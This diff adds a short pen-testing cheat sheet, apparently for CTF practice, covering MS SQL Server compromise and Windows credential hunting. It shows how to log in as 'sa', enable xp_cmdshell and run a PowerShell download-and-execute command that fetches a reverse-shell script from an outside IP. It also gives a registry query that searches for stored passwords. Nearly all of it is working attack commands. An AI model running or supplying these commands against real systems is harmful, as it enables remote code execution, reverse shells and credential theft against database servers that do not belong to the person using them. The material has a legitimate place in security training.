@@ -1,0 +1,33 @@
+// Command reference for CTFs and pen testing practice
+
+
+MS SQL RCE and Rev shell
+----------------------------
+
+sqsh -U sa -S <ip>:<port>
+
+// test xp cmdshell
+xp_cmdshell 'whoami'
+go
+
+// if necessary, enable xp_cmdshell
+EXEC SP_CONFIGURE 'show advanced options',1
+reconfigure 
+go
+
+
+EXEC SP_CONFIGURE 'xp_cmdshell',1
+reconfigure 
+go
+
+// Rev shell options (will be tough if AV is running, try surveying system from here to find a better access method)
+xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring('http://192.168.49.153/rev.ps1')"
+go
+
+can also try certutil or powershell wget (if newish PSVersion)
+
+
+Windows Misc
+-----------------------------
+# Search through registry for "pass" in value name
+reg query HKLM /f pass /t REG_SZ /s
